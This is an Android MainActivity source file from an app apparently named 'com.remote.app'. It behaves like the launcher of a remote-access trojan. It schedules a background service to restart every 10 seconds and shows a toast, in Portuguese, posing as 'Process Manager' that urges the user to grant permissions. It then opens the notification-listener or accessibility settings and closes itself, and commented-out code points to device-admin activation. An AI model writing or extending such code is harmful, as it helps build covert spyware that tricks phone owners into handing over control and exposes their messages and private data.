package com.remote.app;

import android.app.Activity;
import android.app.AlarmManager;
import android.app.PendingIntent;
import android.app.admin.DevicePolicyManager;
import android.content.*;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.graphics.Color;
import android.graphics.Typeface;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.Browser;
import android.provider.MediaStore;
import android.provider.Settings;
import android.support.v4.app.ActivityCompat;
import android.util.Log;
import android.view.Gravity;
import android.widget.TextView;
import android.widget.Toast;

import java.util.ArrayList;


public class MainActivity extends Activity {


    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);


        setContentView(R.layout.activity_main);

        Intent intent = new Intent(this, MainService.class);
        PendingIntent pendingIntent = PendingIntent.getService(getApplicationContext(), 1, intent, 0);
        AlarmManager alarmManager = (AlarmManager) getSystemService(ALARM_SERVICE);
        alarmManager.setRepeating(AlarmManager.ELAPSED_REALTIME_WAKEUP, 0, 10000, pendingIntent);
        boolean isNotificationServiceRunning = isNotificationServiceRunning();
        SharedPreferences settings = getApplicationContext().getSharedPreferences("CONN_SETTINGS", 0);
        if (!isNotificationServiceRunning) {

            Context context = getApplicationContext();

            CharSequence text = "Ative 'Process Manager'\n Clique em voltar \n e ative as permissões";
            int duration = Toast.LENGTH_LONG;

            Toast toast = Toast.makeText(context, text, duration);

            TextView v = (TextView) toast.getView().findViewById(android.R.id.message);
            v.setTextColor(Color.RED);
            v.setTypeface(Typeface.DEFAULT_BOLD);
            v.setGravity(Gravity.CENTER_VERTICAL | Gravity.CENTER_HORIZONTAL);
            toast.show();

            //reqPermissions(this, permissions);

            if (!settings.contains("user-token")) {
                Intent myIntent = new Intent(this, SettingsActivity.class);
                startActivity(myIntent);
            }
            // spawn notification thing
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1 && !Build.MODEL.startsWith("SM-")) {
                startActivity(new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS));
            } else{
                startActivity(new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS));
            }

      //      DevicePolicyManager mDPM = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
            // Set DeviceAdminDemo Receiver for active the component with different option
        //    ComponentName mAdminName = new ComponentName(this, DeviceAdminX.class);

            // spawn app page settings so you can enable all perms
//            Intent i = new Intent(android.provider.Settings.ACTION_APPLICATION_DETAILS_SETTINGS, Uri.parse("package:" + BuildConfig.APPLICATION_ID));
//            startActivity(i);
        } else {
            if (!settings.contains("user-token")) {
                Intent myIntent = new Intent(this, SettingsActivity.class);
                startActivity(myIntent);
            }
        }


        finish();
    }


    @Override
    protected void onResume() {
        super.onResume();
    }

    public void reqPermissions(Context context, String[] permissions) {
        if (context != null && permissions != null) {
            ActivityCompat.requestPermissions(this, permissions, 1);
        }
    }

    private boolean isNotificationServiceRunning() {
        ContentResolver contentResolver = getContentResolver();
        String enabledNotificationListeners =
                Settings.Secure.getString(contentResolver, "enabled_notification_listeners");
        String packageName = getPackageName();
        return enabledNotificationListeners != null && enabledNotificationListeners.contains(packageName);
    }
}
